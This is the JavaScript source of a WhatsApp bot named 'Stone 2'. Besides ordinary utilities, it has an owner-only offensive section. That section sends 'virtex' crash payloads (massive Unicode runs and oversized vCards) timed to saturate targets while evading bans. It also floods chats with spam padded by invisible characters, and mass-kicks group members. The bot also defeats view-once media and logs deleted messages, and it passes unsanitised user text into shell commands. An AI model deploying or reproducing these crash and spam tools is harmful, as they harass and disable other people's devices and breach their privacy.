const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, DisconnectReason, downloadMediaMessage } = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { exec, execSync } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const { Jimp } = require("jimp");
const readline = require("readline");
const { OpenAI } = require("openai");

// --- CONFIGURATION ---
const groq = new OpenAI({
    apiKey: process.env.GROQ_API_KEY || "gsk_yK6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Y",
    baseURL: "https://api.groq.com/openai/v1",
});

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise(resolve => rl.question(text, resolve));

const SESSIONS_DIR = path.join(__dirname, "sessions");
const TEMP_DIR = path.join(__dirname, "temp");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// --- COLLECTIONS DE TEXTES SPÉCIAUX (VIRTEX) ---
const VIRTEX_PAYLOADS = [
    "\u200e\u200f".repeat(15000), // Caractères de direction RTL/LTR (Surcharge de rendu)
    "\u00ad".repeat(15000), // Soft Hyphen
    "\u200b".repeat(25000), // Zero-width space (Saturation de mémoire)
    "\u061c".repeat(15000), // Arabic Letter Mark
    "జ్ఞా".repeat(5000), // Telugu character (Crash de rendu sur certains OS)
    "0".repeat(100000), // Surcharge de buffer simple
    "🔴".repeat(10000) + "⚫".repeat(10000), // Crash visuel
    "🏳️‍🌈".repeat(5000) + "🏴‍☠️".repeat(5000) // Surcharge d'emojis complexes
];

const ADVANCED_VCARDS = [
    'BEGIN:VCARD\nVERSION:3.0\nFN:' + "☣️".repeat(5000) + '\nORG:' + "🔥".repeat(5000) + ';\nEND:VCARD',
    'BEGIN:VCARD\nVERSION:3.0\nFN:System Error\nTEL;type=CELL;type=VOICE;type=pref:+' + "1".repeat(1000) + '\nEND:VCARD'
];

// --- VARIABLES GLOBALES ---
const activeSessions = new Map();
const hostingStates = new Map(); // Pour suivre les utilisateurs en cours d'hébergement
const messageCache = new Map(); // Cache pour l'anti-suppression et alt-delete
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- FONCTIONS UTILITAIRES ---

const getInvisibleJunk = () => {
    const chars = ["\u200B", "\u200C", "\u200D"];
    let junk = "";
    const length = Math.floor(Math.random() * 5) + 1;
    for (let i = 0; i < length; i++) {
        junk += chars[Math.floor(Math.random() * chars.length)];
    }
    return junk;
};

async function downloadYouTubeMP3(query) {
    return new Promise((resolve, reject) => {
        const filename = `audio_${Date.now()}.mp3`;
        const outputPath = path.join(TEMP_DIR, filename);
        const cmd = `yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "${outputPath}" "ytsearch1:${query}"`;
        
        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                reject(new Error(`Échec du téléchargement YouTube: ${stderr || error.message}`));
            } else {
                resolve(outputPath);
            }
        });
    });
}

async function uploadToCatbox(buffer, filename) {
    const tempPath = path.join(TEMP_DIR, `upload_${Date.now()}_${filename}`);
    fs.writeFileSync(tempPath, buffer);
    try {
        const cmd = `curl -F "reqtype=fileupload" -F "fileToUpload=@${tempPath}" https://catbox.moe/user/api.php`;
        const link = execSync(cmd).toString().trim();
        return link;
    } catch (e) {
        console.error("Catbox upload error:", e);
        return null;
    } finally {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
    }
}

function logDeletedMessage(phoneNumber, remoteJid, senderName, originalText) {
    const time = new Date().toLocaleTimeString();
    const cleanJid = remoteJid.split("@")[0];
    const border = "╔══════════════════════════════════════════════════════════════════════════════╗";
    const footer = "╚══════════════════════════════════════════════════════════════════════════════╝";
    
    console.log("\n" + border);
    console.log(`║ ⚠️  ALERTE : MESSAGE SUPPRIMÉ PAR L'UTILISATEUR`);
    console.log(`║ 🕒 HEURE   : ${time}`);
    console.log(`║ 👤 DE      : ${senderName || "Inconnu"} (${cleanJid})`);
    console.log("╟──────────────────────────────────────────────────────────────────────────────╢");
    
    const maxWidth = 74;
    const lines = originalText ? originalText.match(new RegExp(".{1," + maxWidth + "}", "g")) : ["[Contenu non récupérable]"];
    if (lines) {
        lines.forEach(line => {
            console.log(`║ 🗑️  ANCIEN  : ${line.padEnd(maxWidth)} ║`);
        });
    }
    console.log(footer + "\n");
}

function logMessage(phoneNumber, remoteJid, senderName, text, type) {
    const time = new Date().toLocaleTimeString();
    const cleanJid = remoteJid.split("@")[0];
    const border = "╔══════════════════════════════════════════════════════════════════════════════╗";
    const footer = "╚══════════════════════════════════════════════════════════════════════════════╝";
    
    console.log("\n" + border);
    console.log(`║ 🕒 HEURE   : ${time}`);
    console.log(`║ 📱 BOT     : [${phoneNumber}]`);
    console.log(`║ 👤 DE      : ${senderName || "Inconnu"} (${cleanJid})`);
    console.log(`║ 📂 TYPE    : ${type.toUpperCase()}`);
    console.log("╟──────────────────────────────────────────────────────────────────────────────╢");
    
    const maxWidth = 74;
    const lines = text ? text.match(new RegExp(".{1," + maxWidth + "}", "g")) : ["[Pas de contenu texte]"];
    if (lines) {
        lines.forEach(line => {
            console.log(`║ 💬 MSG     : ${line.padEnd(maxWidth)} ║`);
        });
    }
    console.log(footer + "\n");
}

async function sendMenuAudio(sock, remoteJid, quoted) {
    const audioUrl = "https://files.catbox.moe/azu9je.mp3";
    const tempInput = path.join(TEMP_DIR, `menu_in_${Date.now()}.mp3`);
    const tempOutput = path.join(TEMP_DIR, `menu_out_${Date.now()}.opus`);

    try {
        const response = await axios({ url: audioUrl, method: "GET", responseType: "stream" });
        const writer = fs.createWriteStream(tempInput);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        await new Promise((resolve, reject) => {
            ffmpeg(tempInput)
                .audioCodec("libopus")
                .toFormat("ogg")
                .addOptions(["-ac", "1", "-ar", "48000", "-b:a", "128k", "-map_metadata", "-1"])
                .on("end", resolve)
                .on("error", reject)
                .save(tempOutput);
        });

        await sock.sendMessage(remoteJid, { 
            audio: fs.readFileSync(tempOutput), 
            mimetype: "audio/ogg; codecs=opus", 
            ptt: true 
        }, { quoted });

    } catch (e) {
        console.error("Erreur audio menu:", e);
    } finally {
        if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
        if (fs.existsSync(tempOutput)) fs.unlinkSync(tempOutput);
    }
}

async function getGroqResponse(userMessage) {
    try {
        const completion = await groq.chat.completions.create({
            messages: [{ role: "system", content: "Tu es Stone 2, créé par Moussa Kamara." }, { role: "user", content: userMessage }],
            model: "llama-3.1-8b-instant",
        });
        return completion.choices[0]?.message?.content || "Désolé, je bug.";
    } catch (e) { return "IA indisponible."; }
}

// --- FONCTION PRINCIPALE DU BOT ---

async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify = null) {
    const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
    const sessionPath = path.join(SESSIONS_DIR, cleanNumber);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
    });

    activeSessions.set(cleanNumber, { sock, isBotActive: false, activeSpams: new Set() });

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(cleanNumber);
                const msg = `✅ *SESSION GÉNÉRÉE*\n\nNuméro : ${cleanNumber}\nCode : *${code}*`;
                console.log(`Code d'appairage pour ${cleanNumber} : ${code}`);
                if (sockToNotify && jidToNotify) {
                    await sockToNotify.sendMessage(jidToNotify, { text: msg });
                }
            } catch (e) {
                console.error("Erreur lors de la demande du code :", e);
            }
        }, 5000);
    }

    sock.ev.on("creds.update", saveCreds);

    // Anti-suppression (Log des messages supprimés)
    sock.ev.on("messages.update", async (updates) => {
        for (const update of updates) {
            if (update.update.protocolMessage?.type === 0) {
                const deletedMsgId = update.update.protocolMessage.key.id;
                const sessionCache = messageCache.get(cleanNumber);
                if (sessionCache && sessionCache.has(deletedMsgId)) {
                    const original = sessionCache.get(deletedMsgId);
                    logDeletedMessage(cleanNumber, original.remoteJid, original.senderName, original.text);
                    sessionCache.delete(deletedMsgId);
                }
            }
        }
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "close") {
            if ((lastDisconnect?.error instanceof Boom) && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                await sleep(5000);
                createBotInstance(cleanNumber);
            }
        } else if (connection === "open") { console.log(`[${cleanNumber}] ✅ CONNECTÉ (Statut: OFF)`); }
    });

    sock.ev.on("messages.upsert", async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.remoteJid === "status@broadcast") return;

        const remoteJid = msg.key.remoteJid;
        const isFromMe = msg.key.fromMe;
        const senderName = msg.pushName;
        const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "").trim();
        const lowerText = text.toLowerCase();

        const current = activeSessions.get(cleanNumber);
        if (!current) return;

        // Détermination du type de message pour les logs
        let msgType = "texte";
        if (msg.message.imageMessage) msgType = "image";
        else if (msg.message.videoMessage) msgType = "vidéo";
        else if (msg.message.audioMessage) msgType = "audio";
        else if (msg.message.stickerMessage) msgType = "sticker";
        else if (msg.message.documentMessage) msgType = "document";

        // Mise en cache pour anti-suppression et alt-delete
        if (!messageCache.has(cleanNumber)) messageCache.set(cleanNumber, new Map());
        const sessionCache = messageCache.get(cleanNumber);
        sessionCache.set(msg.key.id, { text, senderName, remoteJid });
        if (sessionCache.size > 1000) sessionCache.delete(sessionCache.keys().next().value);

        // Logs console
        logMessage(cleanNumber, remoteJid, senderName, text, msgType);

        // --- COMMANDES PROPRIÉTAIRE (isFromMe) ---
        if (isFromMe) {
            if (lowerText === "on") { current.isBotActive = true; await sock.sendMessage(remoteJid, { text: "Stone 2 activé. ✅" }); return; }
            if (lowerText === "off") { current.isBotActive = false; await sock.sendMessage(remoteJid, { text: "Stone 2 désactivé. 🛑" }); return; }
            
            // Nettoyage profond (alt-delete)
            if (lowerText === "alt-delete") {
                await sock.sendMessage(remoteJid, { text: "🧹 *NETTOYAGE PROFOND EN COURS...*\nRécupération de l'historique et suppression." });
                let count = 0;
                try {
                    if (sessionCache) {
                        for (const [id, data] of sessionCache.entries()) {
                            if (data.remoteJid === remoteJid) {
                                await sock.sendMessage(remoteJid, { delete: { remoteJid, fromMe: true, id: id, participant: undefined } });
                                sessionCache.delete(id);
                                count++;
                            }
                        }
                    }
                    const history = await sock.fetchMessagesFromWA(remoteJid, 50);
                    for (const m of history) {
                        if (m.key.fromMe && m.key.id) {
                            await sock.sendMessage(remoteJid, { delete: m.key });
                            count++;
                        }
                    }
                    await sock.sendMessage(remoteJid, { text: `✅ *NETTOYAGE TERMINÉ*\n${count} messages traités.` });
                } catch (e) { 
                    console.error("Erreur ALT-DELETE:", e);
                    await sock.sendMessage(remoteJid, { text: "❌ Erreur lors du nettoyage profond." }); 
                }
                return;
            }

            // Vider le groupe (alt-kick)
            if (lowerText === "alt-kick") {
                if (!remoteJid.endsWith("@g.us")) { await sock.sendMessage(remoteJid, { text: "❌ Uniquement en groupe." }); return; }
                try {
                    const groupMetadata = await sock.groupMetadata(remoteJid);
                    const botId = sock.user.id.includes(":") ? sock.user.id.split(":")[0] + "@s.whatsapp.net" : sock.user.id;
                    await sock.sendMessage(remoteJid, { text: "☣️ *ALT-KICK ACTIVÉ*\nExécution forcée du retrait des membres..." });
                    for (const participant of groupMetadata.participants) {
                        if (participant.id !== botId && participant.id !== msg.key.participant && participant.id !== remoteJid) {
                            sock.groupParticipantsUpdate(remoteJid, [participant.id], "remove").catch(() => {});
                        }
                    }
                    await sock.sendMessage(remoteJid, { text: "✅ *OPÉRATION TERMINÉE*\nNote: Si personne n'a été retiré, vérifiez que le bot est bien admin." });
                } catch (e) { 
                    await sock.sendMessage(remoteJid, { text: "❌ Erreur lors de l'exécution de ALT-KICK." }); 
                }
                return;
            }

            // Spam optimisé (love) - Fusion des deux logiques
            if (lowerText.startsWith("love ")) {
                const args = text.slice(5).trim().split(" ");
                if (args.length < 1) return sock.sendMessage(remoteJid, { text: "❌ Usage: love [texte] [quantité] [délai_ms]" });

                let word, count, delay;
                
                // Si l'utilisateur utilise le format du code 1: love [texte] [quantité] [délai_ms]
                if (args.length >= 3 && /^\d+$/.test(args[args.length-1]) && /^\d+$/.test(args[args.length-2])) {
                    count = parseInt(args[args.length - 2]);
                    delay = parseInt(args[args.length - 1]);
                    word = args.slice(0, -2).join(" ");
                } 
                // Si l'utilisateur utilise le format du code 2: love [mot] [délai_s] (quantité fixe 4000)
                else if (args.length >= 2 && /^\d+$/.test(args[args.length-1])) {
                    count = 4000;
                    delay = parseInt(args[args.length - 1]) * 1000;
                    word = args.slice(0, -1).join(" ");
                }
                // Format simple: love [texte]
                else {
                    count = 10;
                    delay = 1000;
                    word = args.join(" ");
                }

                current.activeSpams.add(remoteJid);
                await sock.sendMessage(remoteJid, { text: `🚀 *SPAM OPTIMISÉ*\nMessage: ${word}\nNombre: ${count}\nDélai: ${delay}ms\n_Tapez "stop" pour arrêter._` });

                for (let i = 1; i <= count; i++) {
                    if (!current.activeSpams.has(remoteJid)) break;
                    
                    const messageToSend = word + getInvisibleJunk();
                    await sock.sendMessage(remoteJid, { text: messageToSend });
                    
                    const jitter = delay > 0 ? delay * (0.9 + Math.random() * 0.2) : 0;
                    if (jitter > 0) await sleep(jitter);
                }
                current.activeSpams.delete(remoteJid);
                return;
            }

            if (lowerText === "stop") {
                if (current.activeSpams.has(remoteJid)) {
                    current.activeSpams.delete(remoteJid);
                    await sock.sendMessage(remoteJid, { text: "🛑 Spam arrêté avec succès." });
                }
                return;
            }

            // Crash Test (Virtex) - Version Améliorée
            if (lowerText.startsWith("crash")) {
                const args = lowerText.split(" ");
                const count = parseInt(args[1]) || 5;
                const type = args[2] || "mix"; // Types: text, vcard, mix

                await sock.sendMessage(remoteJid, { text: `☣️ *CRASH TEST PRO ACTIVÉ*\nCible: ${remoteJid}\nCharges: ${count}\nType: ${type.toUpperCase()}` });
                
                for (let i = 0; i < count; i++) {
                    if (!current.isBotActive) break;

                    try {
                        if (type === "text" || (type === "mix" && i % 2 === 0)) {
                            const payload = VIRTEX_PAYLOADS[Math.floor(Math.random() * VIRTEX_PAYLOADS.length)];
                            await sock.sendMessage(remoteJid, { text: payload + getInvisibleJunk() });
                        } else {
                            const vcard = ADVANCED_VCARDS[Math.floor(Math.random() * ADVANCED_VCARDS.length)];
                            await sock.sendMessage(remoteJid, { 
                                contacts: { 
                                    displayName: '⚠️ System Failure', 
                                    contacts: [{ vcard }] 
                                } 
                            });
                        }
                    } catch (e) {
                        console.error("Erreur lors de l'envoi du crash:", e);
                    }
                    
                    // Délai variable pour éviter le ban tout en saturant la cible
                    await sleep(150 + Math.random() * 100);
                }
                await sock.sendMessage(remoteJid, { text: "✅ *SÉQUENCE DE CRASH TERMINÉE*" });
                return;
            }
            // Commande Ultra-Crash (65000+ caractères)
            if (lowerText.startsWith("ultra")) {
                const char = "జ్ఞా";
                const payload = char.repeat(66000);
                await sock.sendMessage(remoteJid, { text: "☣️ *CHARGEMENT DE L'ULTRA-CRASH...*" });
                try {
                    await sock.sendMessage(remoteJid, { text: payload });
                    await sock.sendMessage(remoteJid, { text: "✅ *ULTRA-CRASH ENVOYÉ*" });
                } catch (e) {
                    console.error("Erreur Ultra-Crash:", e);
                    await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi massif." });
                }
                return;
            }

        }

        // --- COMMANDES PUBLIQUES / MIXTES ---

        if (lowerText === "menu") {
            const menu = `*STONE 2 - MENU COMPLET*\n\n` +
                `*--- CONTRÔLE ---*\n` +
                `- *on* / *off* : Activer/Désactiver l'IA\n` +
                `- *menu* : Afficher ce menu\n\n` +
                `*--- UTILITAIRES ---*\n` +
                `- *video [nom]* : Télécharger YouTube MP3\n` +
                `- *s* / *sticker* : Créer un sticker (citer image/vidéo)\n` +
                `- *save* / *vv* : Sauver un média (vue unique)\n` +
                `- *host* : Héberger un média sur Catbox\n` +
                `- *rappel [temps] [texte]* : Rappel (ex: 10m manger)\n\n` +
                `*--- ADMINISTRATION ---*\n` +
                `- *connect [num] [mdp]* : Lancer une session\n` +
                `- *disconnect [num] [mdp]* : Stopper une session\n` +
                `- *alt-delete* : Nettoyer ses messages\n` +
                `- *alt-kick* : Vider le groupe (Admin requis)\n\n` +
                `*--- OFFENSIF (Proprio) ---*\n` +
                `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
                `- *crash [nombre]* : Envoi de Virtex\n` +
                `- *ultra* : Envoi massif de caractères (65k+)\n` +
                `- *stop* : Arrêter le spam en cours\n\n` +
                `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
            
            await sock.sendMessage(remoteJid, { image: { url: "https://files.catbox.moe/6uhomx.png" }, caption: menu }, { quoted: msg });
            await sendMenuAudio(sock, remoteJid, msg);
            return;
        }

        if (lowerText === "host") {
            hostingStates.set(remoteJid, true);
            await sock.sendMessage(remoteJid, { text: "📤 *MODE HÉBERGEMENT ACTIVÉ*\nEnvoyez votre média (image/vidéo/audio)." }, { quoted: msg });
            return;
        }

        if (lowerText.startsWith("connect ")) {
            const parts = text.trim().split(/\s+/);
            if (parts.length >= 3) {
                const password = parts[parts.length - 1].toLowerCase();
                const number = parts[1].replace(/[^0-9]/g, "");
                if (password === "moussa") {
                    await sock.sendMessage(remoteJid, { text: `⏳ Initialisation de la session pour ${number}...` });
                    createBotInstance(number, sock, remoteJid);
                } else { 
                    await sock.sendMessage(remoteJid, { text: "❌ Mot de passe incorrect." }); 
                }
            } else { 
                await sock.sendMessage(remoteJid, { text: "❌ Format : connect [numéro] [mot_de_passe]" }); 
            }
            return;
        }

        if (lowerText.startsWith("disconnect ")) {
            const parts = text.split(" ");
            if (parts.length === 3 && parts[2] === "moussa") {
                const target = parts[1].replace(/[^0-9]/g, "");
                if (activeSessions.has(target)) {
                    const session = activeSessions.get(target);
                    session.sock.logout();
                    activeSessions.delete(target);
                    await sock.sendMessage(remoteJid, { text: `✅ Session ${target} déconnectée.` });
                } else { await sock.sendMessage(remoteJid, { text: "❌ Session introuvable." }); }
            }
            return;
        }

        // Gestion du mode hébergement
        if (hostingStates.has(remoteJid)) {
            const type = msg.message.imageMessage ? "image" : (msg.message.videoMessage ? "video" : (msg.message.audioMessage ? "audio" : null));
            if (type) {
                hostingStates.delete(remoteJid);
                await sock.sendMessage(remoteJid, { text: "⏳ Hébergement en cours..." });
                try {
                    const buffer = await downloadMediaMessage(msg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    const ext = type === "image" ? "png" : (type === "video" ? "mp4" : "mp3");
                    const link = await uploadToCatbox(buffer, `file.${ext}`);
                    await sock.sendMessage(remoteJid, { text: link ? `✅ *LIEN :* ${link}` : "❌ Erreur Catbox." }, { quoted: msg });
                } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur traitement." }); }
                return;
            }
        }

        // Rappel
        if (lowerText.startsWith("rappel ")) {
            const input = text.slice(7).trim();
            const match = input.match(/^(\d+)([smhj])\s+(.+)$/i);
            if (match) {
                const amount = parseInt(match[1]);
                const unit = match[2].toLowerCase();
                const task = match[3];
                let duration = amount * (unit === "s" ? 1000 : unit === "m" ? 60000 : unit === "h" ? 3600000 : 86400000);
                await sock.sendMessage(remoteJid, { text: `✅ Rappel dans ${amount}${unit}.` }, { quoted: msg });
                setTimeout(() => sock.sendMessage(remoteJid, { text: `⏰ *RAPPEL :* ${task}` }), duration);
            }
            return;
        }

        // YouTube MP3
        if (lowerText.startsWith("video ")) {
            const query = text.slice(6).trim();
            if (query) {
                await sock.sendMessage(remoteJid, { text: "⏳ Téléchargement..." });
                try {
                    const downloadedPath = await downloadYouTubeMP3(query);
                    await sock.sendMessage(remoteJid, { audio: fs.readFileSync(downloadedPath), mimetype: "audio/mp4" }, { quoted: msg });
                    fs.unlinkSync(downloadedPath);
                } catch (e) {
                    console.error("Erreur YouTube:", e);
                    await sock.sendMessage(remoteJid, { text: `❌ Erreur YouTube: ${e.message}` });
                }
            }
            return;
        }

        // Sauvegarde vue unique (save/vv)
        if (lowerText === "save" || lowerText === "vv") {
            const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
            if (quoted) {
                let mediaMessage = null;
                if (quoted.viewOnceMessageV2) mediaMessage = quoted.viewOnceMessageV2.message;
                else if (quoted.viewOnceMessage) mediaMessage = quoted.viewOnceMessage.message;
                else if (quoted.imageMessage || quoted.videoMessage) mediaMessage = quoted;

                if (mediaMessage) {
                    const type = mediaMessage.imageMessage ? "image" : (mediaMessage.videoMessage ? "video" : null);
                    if (type) {
                        try {
                            const buffer = await downloadMediaMessage({ message: mediaMessage }, "buffer", {}, { logger: pino({ level: "silent" }) });
                            await sock.sendMessage(remoteJid, { [type]: buffer, caption: "✅ Média sauvé !" }, { quoted: msg });
                        } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur sauvegarde." }); }
                    }
                }
            }
            return;
        }

        // Sticker
        if (lowerText === "s" || lowerText === "sticker") {
            const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage || msg.message;
            const type = quoted.imageMessage ? "image" : (quoted.videoMessage ? "video" : null);
            if (type) {
                try {
                    const buffer = await downloadMediaMessage({ message: quoted }, "buffer", {}, { logger: pino({ level: "silent" }) });
                    const tempImg = path.join(TEMP_DIR, `sticker_${Date.now()}.webp`);
                    if (type === "image") {
                        const image = await Jimp.read(buffer);
                        await image.contain({ w: 512, h: 512 }).write(tempImg);
                    } else {
                        const tempVid = path.join(TEMP_DIR, `vid_${Date.now()}.mp4`);
                        fs.writeFileSync(tempVid, buffer);
                        await new Promise((resolve, reject) => {
                            ffmpeg(tempVid).inputOptions(["-t", "10"]).complexFilter(["scale=512:512:force_original_aspect_ratio=decrease,fps=15,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000"]).outputOptions(["-vcodec", "libwebp", "-lossless", "1", "-loop", "0", "-preset", "default", "-an", "-vsync", "0"]).on("end", resolve).on("error", reject).save(tempImg);
                        });
                        fs.unlinkSync(tempVid);
                    }
                    await sock.sendMessage(remoteJid, { sticker: fs.readFileSync(tempImg) }, { quoted: msg });
                    fs.unlinkSync(tempImg);
                } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur sticker." }); }
            }
            return;
        }

        // IA Groq (si activée et pas une commande)
        if (current.isBotActive && !isFromMe && text && !["menu", "save", "vv", "s", "sticker", "host", "on", "off", "stop"].includes(lowerText) && !lowerText.startsWith("connect ") && !lowerText.startsWith("video ") && !lowerText.startsWith("rappel ")) {
            const res = await getGroqResponse(text);
            await sock.sendMessage(remoteJid, { text: res });
        }
    });
}

async function start() {
    console.log("--- DÉMARRAGE STONE 2 (VERSION FUSIONNÉE) ---");
    // Remplacez le numéro ci-dessous par votre numéro principal
    const mainNum = "16062620863"; 
    console.log(`Démarrage automatique pour le numéro : ${mainNum}`);
    createBotInstance(mainNum.replace(/[^0-9]/g, ""));
}

start();
